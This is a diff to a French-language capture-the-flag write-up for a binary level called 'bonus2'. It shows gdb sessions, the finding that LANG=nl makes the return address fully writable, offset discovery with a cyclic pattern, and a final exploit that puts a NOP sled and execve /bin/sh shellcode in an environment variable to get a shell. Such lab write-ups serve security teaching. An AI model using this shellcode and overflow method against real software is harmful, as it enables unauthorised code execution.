@@ -21,16 +21,63 @@ puts("Hello aaaaaaaaaaaaaaaaaaaaaaaaaa"...Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 
+1er appel strncpy: limité à 40 sur 1ere chaine
+2e appel strncpy: limité à 32 sur 2e chaine
+La premiere chaine est mise dans str et la seconde dans str + 40 puis str est strcat avec "Hello "
 
+$> gdb bonus2
+$> r `python -c 'print "A" * 40 + " " + "B" * 32'`
+[...]
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+[...]
+0x08004242 in ?? ()
 
+L'EIP est ecrit mais pas en entier mmmhhhh
 
+(gdb) break *0x080485d6 // juste au niveau du 1er memcmp
+Breakpoint 1 at 0x80485d6
+(gdb) r a b
+Starting program: /home/user/bonus2/bonus2 a b
 
+Breakpoint 1, 0x080485d6 in main ()
+(gdb) x/16c 0x804873d
+0x804873d:	102 'f'	105 'i'	0 '\000'	110 'n'	108 'l'	0 '\000'	0 '\000'	1 '\001'
+0x8048745:	27 '\033'	3 '\003'	59 ';'	56 '8'	0 '\000'	0 '\000'	0 '\000'	6 '\006'
+(gdb) x/16c 0x8048740
+0x8048740:	110 'n'	108 'l'	0 '\000'	0 '\000'	1 '\001'	27 '\033'	3 '\003'	59 ';'
+0x8048748:	56 '8'	0 '\000'	0 '\000'	0 '\000'	6 '\006'	0 '\000'	0 '\000'	0 '\000'
 
+On voit que les memcmp compare LANG avec fi ou nl donc on tente de changer la variable d'env LANG
 
+$> export LANG=nl
+$> r `python -c 'print "A" * 40 + " " + "B" * 32'`
+[...]
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+[...]
+0x42424242 in ?? ()
 
+L'EIP est maintenant bien atteinte.
 
+$> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
 
-$> ./bonus2 `python -c "print 'A' * 40"` `python -c "print 'B' * 23 + '\xb7\xfe\xff\xbf'"`
+Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Goedemiddag! Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+0x38614137 => 23
+On connait mtn l'offset.
+
+On fait comme le bonus0 et on fait un export de notre shellcode car on a pas la place de mettre botre appel a shell:
+$> export shellcode=`python -c 'print "\x90" * 1000 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`
+Puis on run le programme getenv.c pour avoir notre offset
+
+$> /tmp/a.out shellcode ./bonus2
+shellcode found at 0xbffffb2b => \x2b\xfb\xff\xff
+
+$> ./bonus2 `python -c "print 'A' * 40"` `python -c "print 'B' * 23 + '\x2b\xfb\xff\xbf'"`
 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
 $ ls
 ls: cannot open directory .: Permission denied
